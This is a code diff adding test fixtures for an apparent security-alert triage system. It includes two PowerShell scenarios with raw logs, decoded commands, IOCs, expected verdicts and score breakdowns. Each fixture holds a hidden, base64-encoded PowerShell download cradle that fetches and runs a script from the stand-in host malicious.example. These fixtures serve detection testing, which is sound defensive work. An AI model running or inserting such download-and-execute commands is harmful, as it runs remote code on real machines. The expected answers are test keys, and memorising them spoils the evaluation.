+    "body": "EventID=4688 Computer=DC01.acme.local ProcessName=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine=powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAG0AYQBsAGkAYwBpAG8AdQBzAC4AZQB4AGEAbQBwAGwAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA User=NT AUTHORITY\\SYSTEM ParentProcess=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe"
+  },
+  "parsed": {
+    "event_id": 4688,
+    "computer": "DC01.acme.local",
+    "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAG0AYQBsAGkAYwBpAG8AdQBzAC4AZQB4AGEAbQBwAGwAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
+    "encoded_command_b64": "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAG0AYQBsAGkAYwBpAG8AdQBzAC4AZQB4AGEAbQBwAGwAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
+    "decoded_command": "IEX(New-Object Net.WebClient).DownloadString('http://malicious.example/payload.ps1')",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "parent_process": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+    "has_encoded_command": true,
+    "has_download_cradle": true,
+    "has_lolbin_pattern": true,
+    "persistence_artifact_present": false
+  },
+  "iocs": [
+    {"type": "process", "value": "powershell.exe", "pattern": "shell_process_with_cosignal",
+     "note": "PowerShell + -EncodedCommand + WebClient.DownloadString = suspicious_process co-signal path SHOULD fire."},
+    {"type": "url", "value": "http://malicious.example/payload.ps1", "pattern": "download_cradle_target",
+     "note": "Decoded from the base64 payload. Fictional domain for the scenario."},
+    {"type": "user", "value": "NT AUTHORITY\\SYSTEM", "pattern": "high_privilege_actor"},
+    {"type": "process_parent", "value": "WmiPrvSE.exe", "pattern": "wmi_persistence_parent",
+     "note": "WMI provider host as parent of powershell.exe is a classic T1546.003 (WMI subscription) or T1059.001 execution pattern."}
+  ],
+  "expected_iti_category_id": 119,
+  "expected_iti_category_name": "Process Execution",
+  "expected_iti_attack_severity": "SEV1",
+  "expected_score_breakdown": {
+    "suspicious_process": 10,
+    "encoded_command": 20,
+    "lolbin_pattern": 15,
+    "total_bucket": "HIGH"
+  },
+  "expected_verdict": "MALICIOUS_CONFIRMED",
+  "expected_disposition": "true_positive_confirmed_execution",
+  "expected_severity": "SEV1",
+  "test_notes": "Full co-signal path. All three anchors present: (a) encoded command via -EncodedCommand flag; (b) LOLBin pattern via WebClient.DownloadString; (c) high-privilege actor via NT AUTHORITY\\SYSTEM. Score MUST inflate — expected breakdown: suspicious_process +10, encoded_command +20, lolbin_pattern +15 (download cradle). Total lands in HIGH bucket. IMPORTANT: persistence_artifact_present=false — the payload does NOT include registry_run_key_write or scheduled_task_create. Analysis narrative must NOT claim T1059.001 persistence — this is one-shot execution, not persistence."
+}
+""")
+
+_PSH_C = _j(r"""
+{
+  "source": "QRadar WinCollect",
+  "event_type": "WindowsSecurity-4688",
+  "timestamp": "2026-07-05T06:30:00Z",
+  "severity": "High",
+  "confidence": 85,
+  "category": "119 Process Execution",
+  "qradar_categories": ["Process Execution", "Execution"],
+  "alert": {
+    "name": "PowerShell — encoded command, no persistence evidence",
+    "description": "Same base shape as PSH-B (encoded command + download cradle) but explicitly WITHOUT any persistence-artifact evidence in the payload. No registry Run keys written, no scheduled task created, no service installed. Tests the powershell-persistence guardrail: analysis must NOT narrate 'persistence established' without evidence."
+  },
+  "raw_log": {
+    "format": "WindowsEventLog-4688",
+    "syslog_wrapper": "<134>1 2026-07-05T06:30:00Z winhost - - - -",
+    "body": "EventID=4688 Computer=WKS-CORP-217 ProcessName=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine=powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAG0AYQBsAGkAYwBpAG8AdQBzAC4AZQB4AGEAbQBwAGwAZQAvAHMAdABhAGcAZQBSAC4AcABzADEAJwApAA User=ACME\\jane.doe ParentProcess=C:\\Windows\\explorer.exe"
+  },
+  "parsed": {
+    "event_id": 4688,
+    "computer": "WKS-CORP-217",
+    "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAG0AYQBsAGkAYwBpAG8AdQBzAC4AZQB4AGEAbQBwAGwAZQAvAHMAdABhAGcAZQBSAC4AcABzADEAJwApAA",
+    "decoded_command": "IEX(New-Object Net.WebClient).DownloadString('http://malicious.example/stager.ps1')",
+    "user": "ACME\\jane.doe",
+    "parent_process": "C:\\Windows\\explorer.exe",
+    "has_encoded_command": true,
+    "has_download_cradle": true,
+    "persistence_artifact_present": false,
+    "companion_events": {
+      "registry_run_key_write": false,
+      "scheduled_task_create": false,
+      "service_installation": false,
+      "wmi_subscription": false,
+      "startup_folder_write": false
+    }
+  },
+  "iocs": [
+    {"type": "process", "value": "powershell.exe", "pattern": "shell_process_with_cosignal"},
+    {"type": "url", "value": "http://malicious.example/stager.ps1", "pattern": "download_cradle_target"},
+    {"type": "user", "value": "ACME\\jane.doe", "pattern": "standard_user_actor"}
+  ],
+  "expected_iti_category_id": 119,
+  "expected_iti_category_name": "Process Execution",
+  "expected_iti_attack_severity": "SEV2",
+  "expected_verdict": "SUSPICIOUS",
+  "expected_disposition": "true_positive_execution_no_persistence",
+  "expected_severity": "SEV2",
+  "test_notes": "Persistence-guardrail test. All the anti-execution signals fire (encoded-command + download cradle) but there is NO persistence-artifact evidence in the companion_events block. Consumer's analysis narrative must NOT claim 'persistence established via T1059.001' or similar without observing at least one of: registry_run_key_write / scheduled_task_create / service_installation / wmi_subscription / startup_folder_write. Correct narrative: 'encoded-command execution observed; no persistence artifact detected.' If the narrative asserts persistence anyway, the guardrail failed."
+}
+""")
+
+
 # ── Scenario registry: (offence_id, scenario_label, raw_alert) ────
 
 
@@ -1249,6 +1902,19 @@ SCENARIOS: list[tuple[int, str, str, dict]] = [
     (SCENARIO_ID_BASE + 96, "ENRICH-C", "107 Malware — EICAR test file (100% TI confidence, positive control)", _ENRICH_C),
     (SCENARIO_ID_BASE + 97, "ENRICH-D", "117 Recon — outbound to confirmed Tor exit (TorProject/GreyNoise/AbuseIPDB)", _ENRICH_D),
     (SCENARIO_ID_BASE + 98, "ENRICH-E", "117 Recon — inbound from GreyNoise-tagged benign scanner (Shodan)", _ENRICH_E),
+    # v6 SIEM-shape payloads (2026-07-05) — vendor-native raw log formats.
+    # Ten scenarios exercising CEF / LEEF / Palo Alto CSV / JSON envelopes
+    # with field-level test intent. Offence IDs 90101-90110.
+    (SCENARIO_ID_BASE + 101, "TRELLIX-A", "111 EDR Alert — DLL side-loading via signed agent process (T1574.002, CEF)", _TRELLIX_A),
+    (SCENARIO_ID_BASE + 102, "WIN-4672",  "118 Privileged Access — Event 4672 machine-account special privileges (LEEF)", _WIN_4672),
+    (SCENARIO_ID_BASE + 103, "PA-SMB-A",  "110 Network Anomaly — Palo Alto TRAFFIC aged-out to TCP/445, no real exchange (CSV)", _PA_SMB_A),
+    (SCENARIO_ID_BASE + 104, "PA-SMB-B",  "110 Network Anomaly — Palo Alto TRAFFIC aged-out to real Tor exit (CSV)", _PA_SMB_B),
+    (SCENARIO_ID_BASE + 105, "RANSOM-A",  "107 Ransomware — baseline: encryption + shadow-copy + ransom-note + C2", _RANSOM_A),
+    (SCENARIO_ID_BASE + 106, "RANSOM-B",  "107 Ransomware — source severity understated to 'Low' (category-floor test)", _RANSOM_B),
+    (SCENARIO_ID_BASE + 107, "RANSOM-C",  "107 Ransomware — unjustified downstream override attempt (revert test)", _RANSOM_C),
+    (SCENARIO_ID_BASE + 108, "PSH-A",     "119 Process Execution — legitimate admin PowerShell (co-signal-absent, LOW)", _PSH_A),
+    (SCENARIO_ID_BASE + 109, "PSH-B",     "119 Process Execution — encoded PowerShell + download cradle (HIGH bucket)", _PSH_B),
+    (SCENARIO_ID_BASE + 110, "PSH-C",     "119 Process Execution — encoded PowerShell, no persistence evidence (guardrail test)", _PSH_C),
 ]
 
 
